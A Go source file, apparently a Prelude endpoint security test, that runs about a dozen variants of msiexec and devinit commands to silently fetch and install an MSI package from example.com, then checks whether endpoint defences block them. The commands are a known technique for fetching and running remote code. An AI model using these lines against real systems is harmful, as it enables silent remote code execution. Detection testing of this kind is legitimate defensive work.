//go:build windows
// +build windows

/*
ID: 8ba98e28-d83e-451e-8df7-f0964f7e69b6
NAME: Remote File Execution via MSIEXEC
CREATED: 2024-06-30
scenario: execution of MSIEXEC [installer] with url in command line
msiexec.exe can be abused to launch local or network accessible files
*/
package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"

	Endpoint "github.com/preludeorg/test/endpoint"
)

func main() {
	Endpoint.Say("[+] Starting Remote File Execution via MSIEXEC VST")
	Endpoint.Start(test, cleanup)
}

func test() {
	commands := []string{
		"msiexec.exe /i http://example.com/test.msi /q",
		"msiexec.exe -i http://example.com/test.msi -q",
		"msiexec.exe /PaCKagE http://example.com/test.msi /qn",
		"msiexec.exe /i http://example.com/test.msi /qn",
		"msiexec.exe -i http://example.com/test.msi /quiet",
		"msiexec.exe -fv http://example.com/test.msi /quiet",
		"msiexec.exe /i http://example.com/test.msi /quiet",
		"msiexec.exe /i http://example.com/test.msi /qn /quiet",
		"devinit.exe msi-install http://example.com/test.msi",
		"msiexec.exe /i http://example.com/test.msi /quiet INSTALLDIR=%LOCALAPPDATA%",
		"msiexec.exe /i http://example.com/test.msi transforms=http://example.com/transform.mst /q",
	}

	executeCommand := func(command string) {
		if !Endpoint.IsAvailable("cmd.exe") {
			Endpoint.Say("command execution not available")
			Endpoint.Stop(126) // PROTECTED
		}

		out, err := exec.Command("cmd.exe", "/C", command).CombinedOutput()
		if err != nil {
			Endpoint.Say(fmt.Sprintf("[-] Failed to execute command: %s", string(out)))
			Endpoint.Stop(1) // ERROR
		}

		Endpoint.Say(fmt.Sprintf("[+] Successfully executed command: %s", command))

		if strings.Contains(string(out), "Access Denied") {
			Endpoint.Say("[+] Process execution was blocked")
			Endpoint.Stop(126) // PROTECTED: Access Denied
		}
	}

	for _, command := range commands {
		executeCommand(command)
	}

	Endpoint.Stop(101) // UNPROTECTED
}

func cleanup() {
	// No specific cleanup actions required for this VST
	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}